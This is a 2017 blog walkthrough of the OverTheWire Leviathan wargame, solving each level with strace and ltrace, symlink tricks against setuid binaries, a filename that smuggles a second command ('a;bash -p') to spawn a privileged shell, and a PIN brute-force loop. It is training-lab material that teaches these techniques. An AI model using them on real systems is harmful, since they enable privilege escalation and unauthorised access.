---
layout: post
title: "OverTheWire: Leviathan Walkthrough"
date: 2017-09-10     12:00:00
share: true
comments: true
description: Walkthrough for OTW's Leviathan all levels.
tags: [OverTheWire - Leviathan]
---

I won't be explaining too much on what the commands do but focusing more on the techniques and the not so obvious. If you can't interpret the command used make sure to check https://www.explainshell.com/explain


# Leviathan 0 -> 1

Suggested reads: <http://web.engr.oregonstate.edu/~rubinma/Mines_274/Content/Slides/09_output.pdf>

```console
leviathan0@leviathan:~$ ls -al
total 28
drwxr-xr-x  4 leviathan0 leviathan0 4096 Jun 24 07:32 .
drwxr-xr-x 11 root       root       4096 Jun 24 07:32 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Jun 15 11:38 .backup
-rw-r--r--  1 leviathan0 leviathan0  220 Apr  9  2014 .bash_logout
-rw-r--r--  1 leviathan0 leviathan0 3637 Apr  9  2014 .bashrc
drwx------  2 leviathan0 leviathan0 4096 Jun 24 07:32 .cache
-rw-r--r--  1 leviathan0 leviathan0  675 Apr  9  2014 .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls -al
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Jun 15 11:38 .
drwxr-xr-x 4 leviathan0 leviathan0   4096 Jun 24 07:32 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Jun 15 11:38 bookmarks.html
leviathan0@leviathan:~/.backup$ head bookmarks.html 
<!DOCTYPE NETSCAPE-Bookmark-file-1>
<!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! -->
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1 LAST_MODIFIED="1160271046">Bookmarks</H1>

<DL><p>
    <DT><H3 LAST_MODIFIED="1160249304" PERSONAL_TOOLBAR_FOLDER="true" ID="rdf:#$FvPhC3">Bookmarks Toolbar Folder</H3>
leviathan0@leviathan:~/.backup$ tail bookmarks.html 

<DT><A HREF="http://www.synthfool.com/pics.html" ADD_DATE="1119105886" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Synthesizers</A>
<DT><A HREF="http://www.msu.edu/user/svoboda1/taxi_driver/" ADD_DATE="1120334926" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Travis</A>
<DT><A HREF="http://www.paramountclassics.com/virginsuicides/html_3/" ADD_DATE="1100798213" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Virgin Suicides</A>
<DT><A HREF="http://www.warholstars.org/" ADD_DATE="1151503884" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Warhol</A>
<DT><A HREF="http://www.x-rayspex.com/" ADD_DATE="1121479563" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">X-Ray Spex</A>


</DL><p>

leviathan0@leviathan:~/.backup$ wc bookmarks.html 
  1399   6601 133259 bookmarks.html
```

Okay so there's a big ass file with lots of useless info, notice that instead of using cat, I used other tools like head/tail and wc to get a better idea of the file content/size.

Grep comes to the rescue.

```console
leviathan0@leviathan:~/.backup$ grep leviathan bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is XXXXXXX" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password_to_leviathan1</A>
```

Sweet.

---

# Leviathan 1 -> 2

Suggested reads:

* <https://en.wikipedia.org/wiki/Setuid>
* <http://rainbow.chard.org/2011/10/02/debug-like-a-sysadmin/>

```console
leviathan1@leviathan:~$ ls -al
total 32
drwxr-xr-x  3 leviathan1 leviathan1 4096 Jun 24 07:40 .
drwxr-xr-x 11 root       root       4096 Jun 24 07:40 ..
-rw-r--r--  1 leviathan1 leviathan1  220 Apr  9  2014 .bash_logout
-rw-r--r--  1 leviathan1 leviathan1 3637 Apr  9  2014 .bashrc
drwx------  2 leviathan1 leviathan1 4096 Jun 24 07:40 .cache
-rw-r--r--  1 leviathan1 leviathan1  675 Apr  9  2014 .profile
-r-sr-x---  1 leviathan2 leviathan1 7501 Jun 15 11:38 check
leviathan1@leviathan:~$ ./check
password: a
^C
```

So we have a a binary called check with SetUID bit, let's try strace and see what syscalls are being made.

```console
leviathan1@leviathan:~$ strace ./check
execve("./check", ["./check"], [/* 21 vars */]) = 0
[ Process PID=172 runs in 32 bit mode. ]
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd8000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=27480, ...}) = 0
mmap2(NULL, 27480, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd1000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\234\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1750780, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000
mmap2(NULL, 1755772, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e23000
mmap2(0xf7fca000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a7000) = 0xfffffffff7fca000
mmap2(0xf7fcd000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fcd000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e22000
set_thread_area(0xffffd5c0)             = 0
mprotect(0xf7fca000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fd1000, 27480)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd7000
fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd6000
write(1, "password: ", 10password: )              = 10
read(0, 1234
"1234\n", 1024)                 = 5
write(1, "Wrong password, Good Bye ...\n", 29Wrong password, Good Bye ...
) = 29
exit_group(0)                           = ?
+++ exited with 0 +++
```

What that helpful? Kind of, we know that this binary makes a few syscalls like `read()` and `write()` but that's not enough. You might've guessed it already (more like read the resources), but strace checks for syscalls among other stuff, it does not trace what library calls are made. For example printf() is a C function which ltrace will reveal. It ultimately called `read()` which strace will reveal. Using a combination of both will make life easier but it's important to also understand the difference between both.

```console
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd794, 0x80485f0 <unfinished ...>
printf("password: ")                                        = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: a7a
)                = 97
getchar(0x8048680, 47, 0x804a000, 0x8048642)                = 55
getchar(0x8048680, 47, 0x804a000, 0x8048642)                = 97
strcmp("a7a", "sex")                                        = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                        = 29
+++ exited (status 0) +++
```

So `strcmp` (a C function) is called which compares the string read with the word "sex" (very mature), let's submit it this time and see what happens. Do not use ltrace/strace as it will drop the privileges.

```console
leviathan1@leviathan:~$ ./check
password: sex
$ id
uid=12001(leviathan1) gid=12001(leviathan1) euid=12002(leviathan2) groups=12002(leviathan2),12001(leviathan1)
$ cat /etc/leviathan*/leviathan2
password_to_leviathan2
```

Note: `strings` has minimum string length set by 4 to default, that's why it didn't show up the password.

---

# Leviathan 2 -> 3

* <https://en.wikipedia.org/wiki/Ln_(Unix)>
* <https://en.wikipedia.org/wiki/Code_injection>

This one is a brilliant challenge. Take a look at the following ltrace output:

```console
leviathan2@leviathan:~$ ltrace ./printfile "/etc/leviathan_pass/leviathan2"
__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                 = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
system("/bin/cat /etc/leviathan_pass/lev"...XXXXXX
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                      = 0
+++ exited (status 0) +++
```

So what happens is the following:

* Binary takes a file name as input.
* Calls `access()` to check if it has permissions to read that file (`O_RDONLY` flag).
* Creates a string using `sprintf`, using this format `sprintf("/bin/cat %s", filename)`
* Calls `system()` and executes the string.

### Solution 1

Take a look at the following cat behaviour:

```console
leviathan2@leviathan:/tmp/abatchy$ echo 1 > a
leviathan2@leviathan:/tmp/abatchy$ echo 2 > b
leviathan2@leviathan:/tmp/abatchy$ echo 3 > "a b"
leviathan2@leviathan:/tmp/abatchy$ cat a b
1
2
leviathan2@leviathan:/tmp/abatchy$ cat "/tmp/abatchy/a b"
3
leviathan2@leviathan:/tmp/abatchy$ cat /tmp/abatchy/a b 
1
2
leviathan2@leviathan:/tmp/abatchy$ /home//leviathan2/printfile /tmp/abatchy/a b
1
leviathan2@leviathan:/tmp/abatchy$ /home//leviathan2/printfile "/tmp/abatchy/a b"
1
2
```

Notice how cat handled it? 

How is that relevant? Well, when `system("/bin/cat /tmp/abatchy/a b")` is executed, it prints the content of a and b, not `a b`. Yet, the `access()` call made doesn't handle it like `cat`, instead it checks access for the file name provided `a b`. You can see that if you run `strace`.

```
access("/tmp/abatchy/a b", R_OK)        = 0
```

How do we still access `/etc/leviathan_pass/leviathan3`? Using the `ln` command by making a symbolic link to that file.

What we'll do:
1. Symlink `b` to `/etc/leviathan_pass/leviathan3`
2. Execute `printfile "/tmp/abatchy/printfile a b"`

```console
leviathan2@leviathan:/tmp/abatchy$ ln -s /etc/leviathan_pass/leviathan3 b
leviathan2@leviathan:/tmp/abatchy$ /home/leviathan2/printfile "/tmp/abatchy/a b"
1
password_to_leviathan3
```

Just what we expected, it printed the content of both `a` and `b` (the symlink).

PS: We had to use `-s` with `ln` because that would've been a hard link and we don't have enough permission.

### Solution 2

Notice how the input is not being validated properly? It only checks if we have access to it then passes it directly to `system` which doesn't have to execute a single command...

One way in linux to run multiple commands is using `&&` or `;`, what if our file has a name with one of these symbols? Maybe spawn a shell too?

```console
leviathan2@leviathan:/tmp/abatchy$ /home/leviathan2/printfile "a;bash"
1
bash-4.3$ whoami
leviathan2
bash-4.3$ exit
exit
leviathan2@leviathan:/tmp/abatchy$ touch "a;bash -p"
leviathan2@leviathan:/tmp/abatchy$ /home/leviathan2/printfile "a;bash -p"
1
bash-4.3$ whoami
leviathan3
```

I left on purpose my first attempt using `bash`, `-p` prevents the binary from dropping the permissions, they're all the way down in the [man pages](https://linux.die.net/man/1/bash)

```
-p

Turn on privileged mode. In this mode, the $ENV and $BASH_ENV files are not processed, shell functions are not inherited from the environment, and the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored. If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id. If the -p option is supplied at startup, the effective user id is not reset. Turning this option off causes the effective user and group ids to be set to the real user and group ids. 
```

---

# Leviathan 3 -> 4

Again, always check what syscalls/C calls the binary makes:

```console
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd7d4, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                                                    = -1
printf("Enter the password> ")                                                                                                = 20
fgets(Enter the password> abcd
"abcd\n", 256, 0xf7fccc20)                                                                                              = 0xffffd5cc
strcmp("abcd\n", "snlprintf\n")                                                                                               = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                                                    = 19
+++ exited (status 0) +++

leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
password_to_leviathan4
```

---

# Leviathan 4 -> 5

Just running `.trash/bin` spits some binary, `strace` reveals that the password file is being read:

```
open("/etc/leviathan_pass/leviathan5", O_RDONLY) = -1 EACCES (Permission denied)
```

Maybe it just prints the password in binary? Let's use some perl (found this trick mentioned on SO and didn't find a way to use `xxd` for that, if you do please mention it in the comments!):

```console
leviathan4@leviathan:~/.trash$ ./bin | tr -d " " | perl -lpe '$_=pack"B*",$_'
password_to_leviathan5
```

If you don't understand the command check [this](https://www.explainshell.com/explain?cmd=.%2Fbin+%7C+tr+-d+%22+%22+%7C+perl+-lpe+%27%24_%3Dpack%22B*%22%2C%24_%27).

---

# Leviathan 5 -> 6

```console
leviathan5@leviathan:~$ ls -al
total 32
drwxr-xr-x  3 leviathan5 leviathan5 4096 Sep 11 05:55 .
drwxr-xr-x 11 root       root       4096 Sep 11 05:55 ..
-rw-r--r--  1 leviathan5 leviathan5  220 Apr  9  2014 .bash_logout
-rw-r--r--  1 leviathan5 leviathan5 3637 Apr  9  2014 .bashrc
drwx------  2 leviathan5 leviathan5 4096 Sep 11 05:55 .cache
-rw-r--r--  1 leviathan5 leviathan5  675 Apr  9  2014 .profile
-r-sr-x---  1 leviathan6 leviathan5 7642 Jun 15 11:38 leviathan5
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ strace ./leviathan5 
execve("./leviathan5", ["./leviathan5"], [/* 19 vars */]) = 0
[ Process PID=57 runs in 32 bit mode. ]
brk(0)                                  = 0x804b000
...
open("/tmp/file.log", O_RDONLY)         = -1 ENOENT (No such file or directory)
...
```

Okay, so it looks for a `/tmp/file.log`, let's create one and see what happens.

```console
leviathan5@leviathan:~$ echo abatchy > /tmp/file.log
leviathan5@leviathan:~$ echo abatchy > /tmp/file.log && ./leviathan5 
abatchy
```

Well isn't that nice? Can we manipulate it again with a symbolic link?

```console
leviathan5@leviathan:~$ ln -s  /etc/leviathan_pass/leviathan6 /tmp/file.log && ./leviathan5 
password_to_leviathan6
```

---

# Leviathan 6 -> 7

`leviathan6` requires a 4 digit pin to (hopefully) reveal the password, since the search space is really small we can bruteforce this.

To generate 4 digits we can use `seq`, since leading zeroes aren't printed by default we can do it this way: `seq 0000 1111`.

```console
leviathan6@leviathan:~$ for i in $(seq 0000 9999); do ./leviathan6 $i ; done
...
$ whoami
leviathan7
```

---

Aaand that's it! Next will be pwnable.kr challenges.

\- Abatchy